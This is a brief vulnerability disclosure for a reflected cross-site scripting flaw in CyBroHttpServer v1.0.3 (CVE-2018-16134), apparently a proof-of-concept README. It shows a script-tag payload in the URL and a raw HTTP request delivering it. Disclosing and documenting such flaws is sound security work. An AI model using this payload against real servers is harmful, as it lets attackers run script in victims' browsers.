# CyBroHttpServer-v1.0.3-Reflected-XSS
Reflected XSS in CyBroHttpServer v1.0.3 impacts users who open a maliciously crafted link or third-party web page.

# CVE-2018-16134
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16134

# PoC
To exploit vulnerability, someone could use 'http://[host]/<script>alert("selfxss");</script>' request to impact users who open a maliciously crafted link or third-party web page.


```
GET <script>alert('selfxss');</script> HTTP/1.1
Host: 192.168.43.102:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

![alt tag](https://emreovunc.com/blog/en/CyBroHttpServer-v1.0.3-XSS.png)
